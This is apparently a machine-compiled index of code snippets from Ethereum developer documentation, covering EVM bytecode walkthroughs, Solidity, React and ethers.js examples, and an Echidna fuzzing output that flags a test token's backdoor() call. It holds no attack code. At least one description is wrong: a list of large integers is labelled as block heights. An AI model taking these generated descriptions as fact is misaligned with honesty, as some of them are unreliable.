SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 P\n```\n\n----------------------------------------\n\nTITLE: Lookup Table Index Validation in Function 0x81e580d3\nDESCRIPTION: This code validates that the provided index (calldata word) is within the valid range by comparing it with Storage[4]. If the validation fails, the function reverts.\n\nLANGUAGE: evm\nCODE:\n```\n16E | JUMPDEST            | calldataload(4) 0xDA                                                         |\n16F | PUSH1 0x04          | 0x04 calldataload(4) 0xDA                                                    |\n171 | DUP2                | calldataload(4) 0x04 calldataload(4) 0xDA                                    |\n172 | DUP2                | 0x04 calldataload(4) 0x04 calldataload(4) 0xDA                               |\n173 | SLOAD               | Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA                         |\n174 | DUP2                | calldataload(4) Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA         |\n175 | LT                  | calldataload(4)\\<Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA         |\n176 | PUSH2 0x017e        | 0x017EC calldataload(4)\\<Storage[4] calldataload(4) 0x04 calldataload(4) 0xDA |\n179 | JUMPI               | calldataload(4) 0x04 calldataload(4) 0xDA                                    |\n```\n\n----------------------------------------\n\nTITLE: CALLCODE Opcode (F2) Memory Operations\nDESCRIPTION: The CALLCODE opcode (F2) is similar to DELEGATECALL but does not propagate the original msg.sender and msg.value. It stores return data in the specified memory location.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] = returndata\n```\n\n----------------------------------------\n\nTITLE: Defining State Variables in React NFT Minter Component\nDESCRIPTION: State variables to track wallet address, status messages, and NFT metadata (name, description, URL) for the minting interface. These variables will be updated during user interaction and minting events.\n\nLANGUAGE: javascript\nCODE:\n```\n//State variables\nconst [walletAddress, setWallet] = useState(\"\")\nconst [status, setStatus] = useState(\"\")\nconst [name, setName] = useState(\"\")\nconst [description, setDescription] = useState(\"\")\nconst [url, setURL] = useState(\"\")\n```\n\n----------------------------------------\n\nTITLE: Creating Two-Column Content Layout with FAQ Cards in React/JSX\nDESCRIPTION: A responsive two-column layout containing FAQ cards about participation requirements for the Translatathon event.\n\nLANGUAGE: jsx\nCODE:\n```\n<TwoColumnContent>\n  <CardContent>\n    <h3>Who can join?</h3>\n    Be older than 18 years and fluent in at least one language in addition to English.\n  </CardContent>\n  <CardContent>\n    <h3>Do I need to be a translator?</h3>\n    No. You simply have to be bilingual and suggest human translations (using machine translation is forbidden!) to the best of your ability, no professional experience required.\n  </CardContent>\n</TwoColumnContent>\n```\n\n----------------------------------------\n\nTITLE: Implementing setProxy Function for Proxy Pattern in Solidity\nDESCRIPTION: Function that allows the owner to set the proxy address for the token contract. It can only be called once and only by the owner, ensuring security of the privileged proxy access.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev set the address for the proxy (the CalldataInterpreter).\n     * Can only be called once by the owner\n     */\n    function setProxy(address _proxy) external {\n        require(msg.sender == owner, \"Can only be called by owner\");\n        require(proxy == address(0), \"Proxy is already set\");\n\n        proxy = _proxy;\n    }    // function setProxy\n```\n\n----------------------------------------\n\nTITLE: Defining an Asynchronous Function for Zokrates Setup\nDESCRIPTION: Creates an asynchronous function that takes map dimensions and returns Zokrates functions for zero-knowledge operations.\n\nLANGUAGE: typescript\nCODE:\n```\nexport const zkFunctions = async (width: number, height: number) : Promise<any> => {\n```\n\n----------------------------------------\n\nTITLE: Creating an Ethereum Contract Instance with Ethers.js\nDESCRIPTION: JavaScript code that sets up a connection to an Ethereum smart contract using ethers.js. It creates a provider connected to Alchemy, a signer using a private key, and instantiates the contract with its address and ABI.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// Provider\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// Signer\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// Contract\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n```\n\n----------------------------------------\n\nTITLE: Updating Reserves and Price Accumulators in Uniswap V2 (Solidity)\nDESCRIPTION: The _update function updates token reserves and price accumulators on the first transaction in each block. It maintains cumulative price data used for time-weighted average price (TWAP) calculations and ensures balance values don't overflow uint112 storage.\n\nLANGUAGE: solidity\nCODE:\n```\n    // update reserves and, on the first call per block, price accumulators\n    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        }\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, reserve1);\n    }\n```\n\n----------------------------------------\n\nTITLE: Complete Alchemy Web3 Setup for Ethereum Smart Contract Interaction\nDESCRIPTION: The complete initial setup for interacting with an Ethereum smart contract using Alchemy Web3, including environment configuration, contract ABI loading, and contract instantiation.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nrequire(\"dotenv\").config()\nconst alchemyKey = process.env.REACT_APP_ALCHEMY_KEY\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(alchemyKey)\n\nconst contractABI = require(\"../contract-abi.json\")\nconst contractAddress = \"0x6f3f635A9762B47954229Ea479b4541eAF402A6A\"\n\nexport const helloWorldContract = new web3.eth.Contract(\n  contractABI,\n  contractAddress\n)\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Overflow Detection\nDESCRIPTION: This section implements an overflow check to ensure that adding the new value to the stored value won't cause an arithmetic overflow. It uses a bitwise NOT operation and comparison.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Offset | Código de operación | Pila                                                          |\n| ------:| ------------------- | ------------------------------------------------------------- |\n|    1A7 | JUMPDEST            | Value\\* CALLVALUE 0x75 0 6 CALLVALUE                        |\n|    1A8 | PUSH1 0x00          | 0x00 Value\\* CALLVALUE 0x75 0 6 CALLVALUE                   |\n|    1AA | DUP3                | CALLVALUE 0x00 Value\\* CALLVALUE 0x75 0 6 CALLVALUE         |\n|    1AB | NOT                 | 2^256-CALLVALUE-1 0x00 Value\\* CALLVALUE 0x75 0 6 CALLVALUE |\n```\n\n----------------------------------------\n\nTITLE: Incrementor Contract with Assertion for Testing\nDESCRIPTION: The Incrementor contract modified to include an assert statement to verify that the value of tmp is always less than or equal to counter after incrementing.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Incrementor {\n  uint private counter = 2**200;\n\n  function inc(uint val) public returns (uint){\n    uint tmp = counter;\n    counter += val;\n    assert (tmp <= counter);\n    return (counter - tmp);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: HTML List of Muir Glacier EIPs\nDESCRIPTION: HTML list showing the Ethereum Improvement Proposal (EIP) included in the Muir Glacier fork, which delayed the difficulty bomb.\n\nLANGUAGE: html\nCODE:\n```\n<ul>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-2384\">EIP-2384</a> – <em>delays the difficulty bomb for another 4,000,000 blocks, or ~611 days.</em></li>\n</ul>\n```\n\n----------------------------------------\n\nTITLE: Retrieving Uncle by Block Hash and Index Parameters in JavaScript\nDESCRIPTION: Example parameters for the eth_getUncleByBlockHashAndIndex method, which takes a 32-byte block hash and the uncle's index position to retrieve information about a block uncle.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0x1d59ff54b1eb26b013ce3cb5fc9dab3705b415a67127a003c3e61eb445bb8df2\",\n  \"0x0\", // 0\n]\n```\n\n----------------------------------------\n\nTITLE: Listing Ethereum Block Heights in Sequential Order\nDESCRIPTION: A list of Ethereum block height values stored as integers. These numbers likely represent specific blocks in the Ethereum blockchain, possibly used for tracking, analysis, or reference purposes.\n\nLANGUAGE: plain\nCODE:\n```\n189791936, 189923264, 190054208, 190182848, 190315072, 190447424,\n190577984, 190709312, 190840768, 190971328, 191102656, 191233472,\n191364032, 191495872, 191626816, 191758016, 191888192, 192020288,\n192148928, 192282176, 192413504, 192542528, 192674752, 192805952,\n192937792, 193068608, 193198912, 193330496, 193462208, 193592384,\n193723456, 193854272, 193985984, 194116672, 194247232, 194379712,\n194508352, 194641856, 194772544, 194900672, 195035072, 195166016,\n195296704, 195428032, 195558592, 195690304, 195818176, 195952576,\n196083392, 196214336, 196345792, 196476736, 196607552, 196739008,\n196869952, 197000768, 197130688, 197262784, 197394368, 197523904,\n197656384, 197787584, 197916608, 198049472, 198180544, 198310208,\n198442432, 198573632, 198705088, 198834368, 198967232, 199097792,\n199228352, 199360192, 199491392, 199621696, 199751744, 199883968,\n200014016, 200146624, 200276672, 200408128, 200540096, 200671168,\n200801984, 200933312, 201062464, 201194944, 201326144, 201457472,\n201588544, 201719744, 201850816, 201981632, 202111552, 202244032,\n202374464, 202505152, 202636352, 202767808, 202898368, 203030336,\n203159872, 203292608, 203423296, 203553472, 203685824, 203816896,\n203947712, 204078272, 204208192, 204341056, 204472256, 204603328,\n204733888, 204864448, 204996544, 205125568, 205258304, 205388864,\n205517632, 205650112, 205782208, 205913536, 206044736, 206176192,\n206307008, 206434496, 206569024, 206700224, 206831168, 206961856,\n207093056, 207223616, 207355328, 207486784, 207616832, 207749056,\n207879104, 208010048, 208141888, 208273216, 208404032, 208534336,\n208666048, 208796864, 208927424, 209059264, 209189824, 209321792,\n209451584, 209582656, 209715136, 209845568, 209976896, 210106432,\n210239296, 210370112, 210501568, 210630976, 210763712, 210894272,\n211024832, 211156672, 211287616, 211418176, 211549376, 211679296,\n211812032, 211942592, 212074432, 212204864, 212334016, 212467648,\n212597824, 212727616, 212860352, 212991424, 213120832, 213253952,\n213385024, 213515584, 213645632, 213777728, 213909184, 214040128,\n214170688, 214302656, 214433728, 214564544, 214695232, 214826048,\n214956992, 215089088, 215219776, 215350592, 215482304, 215613248,\n215743552, 215874752, 216005312, 216137024, 216267328, 216399296,\n216530752, 216661696, 216790592, 216923968, 217054528, 217183168,\n217316672, 217448128, 217579072, 217709504, 217838912, 217972672,\n218102848, 218233024, 218364736, 218496832, 218627776, 218759104,\n218888896, 219021248, 219151936, 219281728, 219413056, 219545024,\n219675968, 219807296, 219938624, 220069312, 220200128, 220331456,\n220461632, 220592704, 220725184, 220855744, 220987072, 221117888,\n221249216, 221378368, 221510336, 221642048, 221772736, 221904832,\n222031808, 222166976, 222297536, 222428992, 222559936, 222690368,\n222820672, 222953152, 223083968, 223213376, 223345984, 223476928,\n223608512, 223738688, 223869376, 224001472, 224132672, 224262848,\n224394944, 224524864, 224657344, 224788288, 224919488, 225050432,\n225181504, 225312704, 225443776, 225574592, 225704768, 225834176,\n225966784, 226097216, 226229824, 226360384, 226491712, 226623424,\n226754368, 226885312, 227015104, 227147456, 227278528, 227409472,\n227539904, 227669696, 227802944, 227932352, 228065216, 228196288,\n228326464, 228457792, 228588736, 228720064, 228850112, 228981056,\n229113152, 229243328, 229375936, 229505344, 229636928, 229769152,\n229894976, 230030272, 230162368, 230292416, 230424512, 230553152,\n230684864, 230816704, 230948416, 231079616, 231210944, 231342016,\n231472448, 231603776, 231733952, 231866176, 231996736, 232127296,\n232259392, 232388672, 232521664, 232652608, 232782272, 232914496,\n233043904, 233175616, 233306816, 233438528, 233569984, 233699776,\n233830592, 233962688, 234092224, 234221888, 234353984, 234485312,\n234618304, 234749888, 234880832, 235011776, 235142464, 235274048,\n235403456, 235535936, 235667392, 235797568, 235928768, 236057152,\n236190272, 236322752, 236453312, 236583616, 236715712, 236846528,\n236976448, 237108544, 237239104, 237371072, 237501632, 237630784,\n237764416, 237895232, 238026688, 238157632, 238286912, 238419392,\n238548032, 238681024, 238812608, 238941632, 239075008, 239206336,\n239335232, 239466944, 239599168, 239730496, 239861312, 239992384,\n240122816, 240254656, 240385856, 240516928, 240647872, 240779072,\n240909632, 241040704, 241171904, 241302848, 241433408, 241565248,\n241696192, 241825984, 241958848, 242088256, 242220224, 242352064,\n242481856, 242611648, 242744896, 242876224, 243005632, 243138496,\n243268672, 243400384, 243531712, 243662656, 243793856, 243924544,\n244054592, 244187072, 244316608, 244448704, 244580032, 244710976,\n244841536, 244972864, 245104448, 245233984, 245365312, 245497792,\n245628736, 245759936, 245889856, 246021056, 246152512, 246284224,\n246415168, 246545344, 246675904, 246808384, 246939584, 247070144,\n247199552, 247331648, 247463872, 247593536, 247726016, 247857088,\n247987648, 248116928, 248249536, 248380736, 248512064, 248643008,\n248773312, 248901056, 249036608, 249167552, 249298624, 249429184,\n249560512, 249692096, 249822784, 249954112, 250085312, 250215488,\n250345792, 250478528, 250608704, 250739264, 250870976, 251002816,\n251133632, 251263552, 251395136, 251523904, 251657792, 251789248,\n251919424, 252051392, 252182464, 252313408, 252444224, 252575552,\n252706624, 252836032, 252968512, 253099712, 253227584, 253361728,\n253493056, 253623488, 253754432, 253885504, 254017216, 254148032,\n254279488, 254410432, 254541376, 254672576, 254803264, 254933824,\n255065792, 255196736, 255326528, 255458752, 255589952, 255721408,\n255851072, 255983296, 256114624, 256244416, 256374208, 256507712,\n256636096, 256768832, 256900544, 257031616, 257162176, 257294272,\n257424448, 257555776, 257686976, 257818432, 257949632, 258079552,\n258211136, 258342464, 258473408, 258603712, 258734656, 258867008,\n258996544, 259127744, 259260224, 259391296, 259522112, 259651904,\n259784384, 259915328, 260045888, 260175424, 260308544, 260438336,\n260570944, 260700992, 260832448, 260963776, 261092672, 261226304,\n261356864, 261487936, 261619648, 261750592, 261879872, 262011968,\n262143424, 262274752, 262404416, 262537024, 262667968, 262799296,\n262928704, 263061184, 263191744, 263322944, 263454656, 263585216,\n263716672, 263847872, 263978944, 264108608, 264241088, 264371648,\n264501184, 264632768, 264764096, 264895936, 265024576, 265158464,\n265287488, 265418432, 265550528, 265681216, 265813312, 265943488,\n266075968, 266206144, 266337728, 266468032, 266600384, 266731072,\n266862272, 266993344, 267124288, 267255616, 267386432, 267516992,\n267648704, 267777728, 267910592, 268040512, 268172096, 268302784,\n268435264, 268566208, 268696256, 268828096, 268959296, 269090368,\n269221312, 269352256, 269482688, 269614784, 269745856, 269876416,\n270007616, 270139328, 270270272, 270401216, 270531904, 270663616,\n270791744, 270924736, 271056832, 271186112, 271317184, 271449536,\n271580992, 271711936, 271843136, 271973056, 272105408, 272236352,\n272367296, 272498368, 272629568, 272759488, 272891456, 273022784,\n273153856, 273284672, 273415616, 273547072, 273677632, 273808448,\n273937088, 274071488, 274200896, 274332992, 274463296, 274595392,\n274726208, 274857536, 274988992, 275118656, 275250496, 275382208,\n275513024, 275643968, 275775296, 275906368, 276037184, 276167872,\n276297664, 276429376, 276560576, 276692672, 276822976, 276955072,\n277085632, 277216832, 277347008, 277478848, 277609664, 277740992,\n277868608, 278002624, 278134336, 278265536, 278395328, 278526784,\n278657728, 278789824, 278921152, 279052096, 279182912, 279313088,\n279443776, 279576256, 279706048, 279838528, 279969728, 280099648,\n280230976, 280361408, 280493632, 280622528, 280755392, 280887104,\n281018176, 281147968, 281278912, 281411392, 281542592, 281673152,\n281803712, 281935552, 282066496, 282197312, 282329024, 282458816,\n282590272, 282720832, 282853184, 282983744, 283115072, 283246144,\n283377344, 283508416, 283639744, 283770304, 283901504, 284032576,\n284163136, 284294848, 284426176, 284556992, 284687296, 284819264,\n284950208, 285081536]\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC-20 Token Transfer Implementation\nDESCRIPTION: This EVM bytecode segment implements the token transfer functionality of an ERC-20 token. It handles balance updates, emits Transfer events, and includes SafeMath checks to prevent overflow and underflow conditions.\n\nLANGUAGE: evm\nCODE:\n```\nMSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Echidna Test Output Showing Failure\nDESCRIPTION: Example output from running Echidna on the TestToken contract, showing that it found a sequence of function calls that violates the property by calling airdrop and then backdoor.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test testtoken.sol --contract TestToken\n...\n\nechidna_balance_under_1000: failed!💥\n  Call sequence, shrinking (1205/5000):\n    airdrop()\n    backdoor()\n\n...\n```\n\n----------------------------------------\n\nTITLE: Loading Environment Variables from .env File\nDESCRIPTION: Setting up dotenv to load environment variables from a .env file, which will be used for the private key.\n\nLANGUAGE: typescript\nCODE:\n```\n// This is how we add the definitions in .env to process.env.\nimport * as dotenv from \"dotenv\";\ndotenv.config()\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC-20 Token Transfer Implementation\nDESCRIPTION: This EVM bytecode segment implements the token transfer functionality of an ERC-20 token. It handles balance updates, emits Transfer events, and includes SafeMath checks to prevent overflow and underflow conditions.\n\nLANGUAGE: evm\nCODE:\n```\nMSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Creating a Subgraph Manifest for The Graph\nDESCRIPTION: A YAML configuration file for The Graph that defines what smart contracts to index, which events to listen for, and how to handle the data. This manifest connects the smart contract to The Graph's indexing protocol.\n\nLANGUAGE: yaml\nCODE:\n```\nspecVersion: 0.0.1\ndescription: Placing Bets on Ethereum\nrepository: - GitHub link -\nschema:\n  file: ./schema.graphql\ndataSources:\n  - kind: ethereum/contract\n    name: GameContract\n    network: mainnet\n    source:\n      address: '0x2E6454...cf77eC'\n      abi: GameContract\n      startBlock: 6175244\n    mapping:\n      kind: ethereum/events\n      apiVersion: 0.0.1\n      language: wasm/assemblyscript\n      entities:\n        - GameContract\n      abis:\n        - name: GameContract\n          file: ../build/contracts/GameContract.json\n      eventHandlers:\n        - event: PlacedBet(address,uint256,bool)\n          handler: handleNewBet\n      file: ./src/mapping.ts\n```\n\n----------------------------------------\n\nTITLE: Retrieving CryptoKitties Birth Events with Web3.py\nDESCRIPTION: This code snippet fetches recent birth events for CryptoKitties NFTs from the Ethereum blockchain. It queries the last 120 blocks for logs with the birth event signature, then processes the logs into a list of birth events.\n\nLANGUAGE: python\nCODE:\n```\n# - https://etherscan.io/tx/0x3978028e08a25bb4c44f7877eb3573b9644309c044bf087e335397f16356340a\nbirth_logs = w3.eth.get_logs({\n    \"fromBlock\": w3.eth.block_number - 120,\n    \"address\": w3.to_checksum_address(ck_token_addr),\n    \"topics\": [ck_event_signatures[1]]\n})\n\nrecent_births = [get_event_data(w3.codec, ck_extra_events_abi[1], log)[\"args\"] for log in birth_logs]\n```\n\n----------------------------------------\n\nTITLE: Embedding YouTube Video in Markdown Document\nDESCRIPTION: A YouTube component used to embed a video showcasing Luna's first appearance as a podcast guest, demonstrating AI agents' capabilities.\n\nLANGUAGE: jsx\nCODE:\n```\n<YouTube id=\"ZCsOMxnIruA\" />\n```\n\n----------------------------------------\n\nTITLE: Modifying Zero-Knowledge Proof to Test Wrong Proof Data\nDESCRIPTION: Code modification to test what happens when correct inputs but invalid proof data is provided, which should also fail verification.\n\nLANGUAGE: typescript\nCODE:\n```\nproof.proof = {\n  a: [\"0x\" + \"1\".padStart(64, \"0\"), \"0x\" + \"2\".padStart(64, \"0\")],\n  b: [\n    [\"0x\" + \"1\".padStart(64, \"0\"), \"0x\" + \"2\".padStart(64, \"0\")],\n    [\"0x\" + \"1\".padStart(64, \"0\"), \"0x\" + \"2\".padStart(64, \"0\")],\n  ],\n  c: [\"0x\" + \"1\".padStart(64, \"0\"), \"0x\" + \"2\".padStart(64, \"0\")],\n}\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for ERC20 Token Implementation\nDESCRIPTION: Compiled EVM bytecode for an ERC20 token implementation showing memory operations, function calls, and event emissions. This includes operations for token transfers, balance management, and error handling with overflow protection.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nMSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 